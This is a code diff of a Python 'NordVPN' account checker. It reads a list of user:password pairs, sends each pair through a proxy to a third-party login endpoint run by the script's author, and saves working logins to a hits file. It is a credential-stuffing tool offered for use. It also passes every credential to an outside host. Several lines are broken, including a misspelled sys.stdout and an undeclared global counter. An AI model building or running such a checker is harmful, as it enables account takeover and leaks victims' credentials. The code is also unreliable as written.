@@ -1,32 +1,49 @@
-# <coded by josif>
-# Contact  : +8801868608046 (Whatsapp)
-# Github   : https://github.com/josifkhang/nordvpn-login-api
-# Telegram : t.me/josifkhan
-# -----------------------------------------------------------------------
-import requests
+# <coded by @josifkhan>
+import requests,sys
+# colors
+rd  = "\033[1;31m"
+yl  = "\033[1;33m"
+grn = "\033[1;32m"
+en  = "\033[0m"
+ok  = [0]
+tts = [0]
+xa  = 0
+# ----------------------------------------------
 class NORDVPN:
 	def login(selfy,user,password,proxy_url):
+		sys.stdou.write(f"\r{grn}◩\033[1;35mCHECKING]: {xa}/{grn}{ok[0]}{en}/{tts[0]}")
 		with requests.Session() as session:
 			url = "https://nordvpn.josiftools.com/nordlogin"
 			params = {
 				"user": user,
 				"pass": password,
-				"proxies": proxy_url #optional but recommended
+				"proxies": proxy_url,
 			}
 			try:
-				response = session.get(url, params=params, timeout=10)
-				print("Response Text:", response.json())
-				# return response.json()
-			except requests.exceptions.RequestException as e:print("Error:", e)
+				response = session.get(url, params=params, timeout=10);xa+=1
+				return response.json()
+			except requests.exceptions.RequestException as e:print("Error:", e);return {"message":"Error"}
+	def main(self):
+		with open(input(f"{grn}◩{rd}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
+		for account in accounts:
+			user     = account.split(":")[0].strip()
+			password = account.split(":")[1].strip()
+			proxy_url= "http://username:password@host:port"
+			response = self.login(user=user,password=password,proxy_url=proxy_url)
+			if response['status']=='no':
+				print(f'\r{grn}◩{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+			elif response['status']=='ok':
+				print(f'\r{grn}◩{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+				ok[0] = '1'
+				with open("hits_ok.txt","a") as f2:f2.write(f"{user}:{password}\n")
+			else:print(f'\r{grn}◩{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
+
 # -----------------------------------------------------------------------
 email     = "user_email@josiftools.com"
 password  = "user_pass"
 proxy_url = "http://username:password@host:port" # http or socks5
 # -----------------------------------------------------------------------
 nd = NORDVPN()
-nd.login(user=email,password=password,proxy_url=proxy_url)
-
+nd.main()
 # -----------------------------------------------------------------------
-# ✅NOTICE: THIS API HAS LIMIT, IF U R INTERESTED IN SOURCE CODE YOU CAN CONTACT ME.
-
-
+# ✅NOTICE: THIS API HAS LIMIT, IF U R INTERESTED IN ACTUAL SOURCE CODE YOU CAN CONTACT ME.
